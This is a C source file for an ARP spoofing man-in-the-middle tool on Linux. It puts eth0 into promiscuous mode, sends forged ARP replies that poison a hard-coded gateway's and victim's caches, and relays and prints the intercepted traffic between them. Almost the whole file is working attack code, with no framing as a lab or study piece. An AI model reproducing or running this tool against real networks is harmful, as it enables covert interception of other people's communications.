#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <time.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <netpacket/packet.h>

typedef unsigned short int u16;
typedef unsigned int u32;
typedef short int s16;
typedef int s32; 
typedef char s8;
typedef unsigned char u8;

#define ETH_P_ALL 0x3
#define ETH_P_IP 0X800
#define ETH_P_ARP 0x806
#define ETH_HDR 14
#define ETH_MIN_DATA 60
#define ETH_ADDR_SIZE 6
#define ETH_P_802_3 0x0001 
#define ARPOP_REQUEST 1
#define ARPOP_RESPONSE 2
#define PFPACKET 1
//#define AFINET 1

struct eth_hdr
{
	u8 dst_eth[6];
	u8 src_eth[6];
	u16 type;
};

#pragma pack(2)
struct arp_hdr
{
	u16 arp_hrdtype;
	u16 arp_protype;
	u8 arp_hrdlen;
	u8 arp_prolen;
	u16 arp_op;
	
	u8 arp_src[ETH_ADDR_SIZE];
	struct in_addr arp_srcip;
	u8 arp_dst[ETH_ADDR_SIZE];
	struct in_addr arp_dstip;
};
#pragma pack()

struct ip_hdr
{
	//u8 version:4,
	//	ip_hdrlen:4;
	u8 ip_hdrlen:4,
		version:4;
	u8  tos;
	u16 len;
	u16 id;
	u16 offset;
	u8 ttl;
	u8  protocol;
	u16 ip_sum;
	struct in_addr src;
	struct in_addr dst;
};

struct tcp_hdr
{
	u16 src_port;
	u16 dst_port;
	u32 req;
	u32 ack_req;
	u32 tcp_hdrlen:4,
		 resl:6,
		 urg:1,
		 ack:1,
		 psh:1,
		 rst:1,
		 syn:1,
		 fin:1;
	u16 window;
	u16 tcp_sum;
	u16 urg_ptr;
};
enum to_target
{
	to_none,
	to_attack,
	to_netgate,
};

u8 buf[1514];
s32 sockfd;
#ifdef AFINET
struct sockaddr sockaddr;
#endif
#ifdef PFPACKET
struct sockaddr_ll sockaddr, dest_sock;
#endif
u8 my_mac[6] = {0x00, 0x0C, 0x29, 0x0F, 0xB3, 0xD0};
struct in_addr myip;
u8 netgate[6] = {0,};
struct in_addr ngip;
u8 attack_mac[6] = {0,};
struct in_addr attip;
enum to_target totarget = to_none;
u8 ng_flag = 0, attack_flag = 0;

u8 *arp_create(u16 type, struct in_addr srcip, struct in_addr dstip, u8 *src_mac, u8 *dst_mac)
{
	struct eth_hdr *ethdr;
	struct arp_hdr *arphdr;
	u8 *ptr;
	u8 board_mac[ETH_ADDR_SIZE] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	u8 j;
	
	ptr = (u8 *)malloc(ETH_MIN_DATA);
	memset(ptr,0,ETH_MIN_DATA);
	ethdr = (struct eth_hdr *)ptr;
	
	memcpy(ethdr->src_eth, src_mac, ETH_ADDR_SIZE);
	if(NULL == dst_mac)
	{
		memcpy(ethdr->dst_eth, board_mac, ETH_ADDR_SIZE);
	}
	else
	{
		memcpy(ethdr->dst_eth, dst_mac, ETH_ADDR_SIZE);
	}

	ethdr->type = htons(ETH_P_ARP);
	
	arphdr = (struct arp_hdr *)(ptr+ETH_HDR);
	arphdr->arp_hrdtype = htons(ETH_P_802_3);
	arphdr->arp_protype = htons(ETH_P_IP);
	arphdr->arp_hrdlen = ETH_ADDR_SIZE;
	arphdr->arp_prolen = 4;
	arphdr->arp_op = htons(type);
	
	memcpy(arphdr->arp_src, src_mac, ETH_ADDR_SIZE);
	arphdr->arp_srcip = srcip;
	//printf("Ip=%s\n",inet_ntoa(srcip));
	if(NULL == dst_mac)
	{
		memcpy(arphdr->arp_dst, board_mac, ETH_ADDR_SIZE);
	}
	else
	{
		memcpy(arphdr->arp_dst, dst_mac, ETH_ADDR_SIZE);
	}
	arphdr->arp_dstip = dstip;
	
	/*
	printf("Create ");
	for(j=0;j<6;j++)
	{
		printf("%02x-",ethdr->dst_eth[j]);
	}
	printf("Create ");
	for(j=0;j<6;j++)
	{
		printf("%02x-",ethdr->src_eth[j]);
	}
	printf("type:%x\n",ethdr->type);
	printf("hrdtype=%d ",arphdr->arp_hrdtype);
	printf("protype=%x ",arphdr->arp_protype);
	printf("hdrlen=%d ",arphdr->arp_hrdlen);
	printf("prolen=%d ",arphdr->arp_prolen);
	printf("operation=%d\n",arphdr->arp_op);
	printf("srcip=%s\n",inet_ntoa(arphdr->arp_srcip));
	printf("dstip=%s\n",inet_ntoa(arphdr->arp_dstip));
	printf("ptr=%x\n",ptr);
	*/
	
	return ptr;
}

void arp_reply(enum to_target to)
{
	u8 *ptr = NULL;
	u16 len;
	
	if(to == to_netgate)
	{
		ptr = arp_create(ARPOP_RESPONSE, attip, ngip, my_mac, netgate);

	}
	else if(to == to_attack)
	{
		ptr = arp_create(ARPOP_RESPONSE, ngip, attip, my_mac, attack_mac);
	}

	#ifdef AFINET
	len = sendto(sockfd, ptr, ETH_MIN_DATA,0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr));
	#endif
	#ifdef PFPACKET
	len = sendto(sockfd, ptr, ETH_MIN_DATA,0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr_ll));
	#endif
	
	if(len < 0)
	{
		perror("send data failed!\n");
		exit(-1);
	}
	free(ptr);
}

void arp_request(enum to_target to)
{
	u8 *ptr = NULL;
	u16 len;
	
	if(to == to_netgate)
	{
		ptr = arp_create(ARPOP_REQUEST, attip, ngip, my_mac, NULL);
		//printf("arp request ptr=%x\n", ptr);
	}
	else if(to == to_attack)
	{
		//printf("to attack");
		ptr = arp_create(ARPOP_REQUEST, ngip, attip, my_mac, NULL);
	}
	
	#ifdef AFINET
	len = sendto(sockfd, ptr, ETH_MIN_DATA,0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr));
	#endif
	#ifdef PFPACKET
	len = sendto(sockfd, ptr, ETH_MIN_DATA,0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr_ll));
	#endif
	//len = sendto(sockfd, ptr, ETH_MIN_DATA, 0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr));
	
	if(len < 0)
	{
		perror("send data failed!\n");
		exit(-1);
	}
	free(ptr);
}

void *arp_send(void *argv)
{
		//while((ng_flag == 0) || (attack_flag == 0))
		while(1)
		{
			arp_request(to_netgate);
			arp_request(to_attack);
			printf("arp sentd\n");
			sleep(10);
		}
		/*
		while((ng_flag == 1) && (attack_flag == 1))
		{
			arp_reply(to_attack);
			arp_reply(to_netgate);
			printf("arp send----------------------\n");
			sleep(10);
		}
		*/
}


void *false_arpaddr(void *argv)
{
	fd_set readfd;
	s32 ret;
	struct	timeval tv;
	s32 readsize;
	
	struct ip_hdr *iphdr=NULL;
	struct eth_hdr *ethdr=NULL;
	struct arp_hdr *arphdr=NULL;
	u32 len;
	s8 j=0;
	
	while(1)
	{
		/*
		len = sizeof(struct sockaddr);
		readsize = recvfrom(sockfd, buf, sizeof(buf),0, (struct sockaddr *)&sockaddr, &len);
		if(readsize < 0)
		{
			perror("read data failed!\n'");
			close(sockfd);
			exit(-1);
		}
		
		iphdr = ((struct ip_hdr *)(buf+14));
		printf("src:%s,",inet_ntoa(iphdr->src));
		printf(" dst:%s\n",inet_ntoa(iphdr->dst));
		*/
		FD_ZERO(&readfd);
		FD_SET(sockfd, &readfd);
		tv.tv_usec = 0;
		tv.tv_sec = 10;
		
		ret = select(sockfd+1, &readfd, NULL, NULL, &tv);
		//printf("select after!\n");
		switch(ret)
		{
			case -1:
				close(sockfd);
				printf("Select failed!\n");
				break;
			case 0:
				printf("timeout\n");
				continue;
				break;
			default:
				if(FD_ISSET(sockfd, &readfd) > 0)
				{
					memset(buf,0,sizeof(buf));
					readsize = read(sockfd, buf, sizeof(buf));
					if(readsize < 0)
					{
						perror("read data failed!\n'");
						close(sockfd);
						exit(-1);
					}
					
					ethdr = (struct eth_hdr *)buf;
					
					//printf("SIZE:%d\n",readsize);
					printf("Dest Mac: ");
					for(j=0;j<6;j++)
					{
						printf("%02x-",ethdr->dst_eth[j]);
					}
					printf("Src Mac: ");
					for(j=0;j<6;j++)
					{
						printf("%02x-",ethdr->src_eth[j]);
					}
					printf("type = %x", ntohs(ethdr->type));
					printf("\n");
					
					if(ETH_P_IP == ntohs(ethdr->type))
					{
						iphdr = ((struct ip_hdr *)(buf + ETH_HDR));
						printf("version = %d, protocol = %d\n",iphdr->version,iphdr->protocol);
						//if(iphdr->version == 4 && (iphdr->protocol == 6 || iphdr->protocol == 17) && ((attip.s_addr == iphdr->src.s_addr) || (attip.s_addr == iphdr->dst.s_addr)))
						if(iphdr->version == 4 && (iphdr->protocol == 6 || iphdr->protocol == 17))
						{
							printf("----------------------------\n");
							printf("version:%d ",iphdr->version);
							printf("ip_hdrlen:%d ",iphdr->ip_hdrlen);
							printf("tos:%d ",iphdr->tos);
							printf("len:%d ",ntohs(iphdr->len));
							printf("id:%d ",ntohs(iphdr->id));
							printf("offset:%d ",ntohs(iphdr->offset));
							printf("ttl:%d ",iphdr->ttl);
							printf("protocol:%d ",iphdr->protocol);
							printf("ip_sum:%d ",ntohs(iphdr->ip_sum));
							printf("src:%s,",inet_ntoa(iphdr->src));
							printf(" dst:%s\n",inet_ntoa(iphdr->dst));
							if((ng_flag == 1) && (attack_flag == 1))
							{
								s32 len = 0, rev_flag = 0;
								//if(iphdr->dst.s_addr == attip.s_addr)
								if((iphdr->src.s_addr == ngip.s_addr) && (iphdr->dst.s_addr == attip.s_addr))
								{
									rev_flag = 1;
									printf("netgate-----------------------------\n");
									memcpy(buf, attack_mac, 6);
									memcpy(buf+6, my_mac, 6);
								}
								else if((iphdr->src.s_addr == attip.s_addr) && (iphdr->dst.s_addr == ngip.s_addr))
								{
									rev_flag = 1;
									printf("attack------------------------------\n");
									memcpy(buf, netgate, 6);
									memcpy(buf+6, my_mac, 6);
								}
								if(rev_flag == 1)
								{
									len = sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)&sockaddr,sizeof(struct sockaddr_ll));
									if(len < 0)
									{
										perror("revert transfer data failed!\n");
										exit(-1);
									}
									printf("sendto(%d)-------------------------------\n",len);
								}
								
							}
						}
					}
					
					//else if(ETH_P_ARP == ntohs(ethdr->type))
					if(ETH_P_ARP == ntohs(ethdr->type))
					{
						u8 j;
						
						/*
						for(j=0;j<60;j++)
						{
							printf("%02x ",buf[j]);
							if((j+1) % 10 == 0)
								printf("\n");
						}
						*/
						
						//printf("arp process!\n");
						//printf("SIZE:%d\n",readsize);
						arphdr = (struct arp_hdr *)(buf+ETH_HDR);
						printf("hrdtype=%d ",ntohs(arphdr->arp_hrdtype));
						printf("protype=%x ",ntohs(arphdr->arp_protype));
						printf("hdrlen=%d ",arphdr->arp_hrdlen);
						printf("prolen=%d ",arphdr->arp_prolen);
						printf("operation=%d\n",ntohs(arphdr->arp_op));
						printf("srcip=%s\n",inet_ntoa(arphdr->arp_srcip));
						printf("dstip=%s\n",inet_ntoa(arphdr->arp_dstip));
						printf("src_mac:");
						for(j=0;j<6;j++)
						{
							printf("%02x-",arphdr->arp_src[j]);
						}
						printf("dst_mac:");
						for(j=0;j<6;j++)
						{
							printf("%02x-",arphdr->arp_dst[j]);
						}
						printf("\n");
						if((arphdr->arp_srcip.s_addr == ngip.s_addr) && (ntohs(arphdr->arp_op) == 0x2))
						{
							printf("step1\n");
							memcpy(netgate, arphdr->arp_src,6);
							ng_flag = 1;
						}
						if((arphdr->arp_srcip.s_addr == attip.s_addr) && (ntohs(arphdr->arp_op) == 0x2))
						{
							printf("step2\n");
							memcpy(attack_mac, arphdr->arp_src,6);
							attack_flag = 1;
						}
					}
					
					if((ng_flag == 1) && (attack_flag == 1))
					{
						arp_reply(to_attack);
						arp_reply(to_netgate);
						if((arphdr->arp_srcip.s_addr == ngip.s_addr) && (ntohs(arphdr->arp_op) == 0x1) && (arphdr->arp_dstip.s_addr == attip.s_addr))
						{
							printf("step3\n");
							arp_reply(to_netgate);
						}
						if((arphdr->arp_srcip.s_addr == attip.s_addr) && (ntohs(arphdr->arp_op) == 0x1) && (arphdr->arp_dstip.s_addr == ngip.s_addr))
						{
							printf("step4\n");
							arp_reply(to_attack);
						}
					}
					

				}
				break;
		}
	}
	
}

int main(void)
{
		
		u8 *ethname = "eth0";
		struct ifreq ifr;
		s32 i;
		pthread_t pt[2];
		
		myip.s_addr = inet_addr("192.168.1.103");
		ngip.s_addr = inet_addr("192.168.1.1");
		attip.s_addr = inet_addr("192.168.1.100");
		
		#ifdef PFPACKET
		sockfd = socket(PF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
		#endif
		
		#ifdef AFINET
		sockfd = socket(AF_INET,SOCK_PACKET, htons(ETH_P_ALL));
		//sockfd = socket(AF_INET,SOCK_RAW, IPPROTO_TCP);
		#endif
		
		if(sockfd < 0)
		{
			perror("Create socket failed!\n");
			exit(-1);
		}
		
		strcpy(ifr.ifr_name, ethname);
		i = ioctl(sockfd, SIOCGIFFLAGS,&ifr);
		if(i < 0)
		{
			close(sockfd);
			printf("can't get flags \n");
			exit (-1);
		}
		ifr.ifr_flags |= IFF_PROMISC;
		i = ioctl(sockfd, SIOCSIFFLAGS, &ifr);
		if(i < 0)
		{
			close(sockfd);
			printf("can't set flags \n");
			exit (-1);
		}
		
		#ifdef AFINET
		bzero(&sockaddr, sizeof(struct sockaddr));
		sockaddr.sa_family = AF_INET;
		strcpy(sockaddr.sa_data,"eth0");
		#endif
		
		#ifdef PFPACKET
		bzero(&sockaddr, sizeof(struct sockaddr_ll));
		sockaddr.sll_family = PF_PACKET;
		sockaddr.sll_ifindex = if_nametoindex("eth0");
		//sockaddr.sll_ifindex = ifr.ifr_ifindex;
		sockaddr.sll_protocol = htons(ETH_P_ALL);
		#endif
		//i = 1;
		//setsockopt(sockfd, SOL_IP, IP_HDRINCL, &i, sizeof(i));

		pthread_create(&pt[0],NULL, arp_send, NULL);
		pthread_create(&pt[1],NULL, false_arpaddr, NULL);
		pthread_join(pt[0],NULL);
		pthread_join(pt[1],NULL);
		
		return 0;
}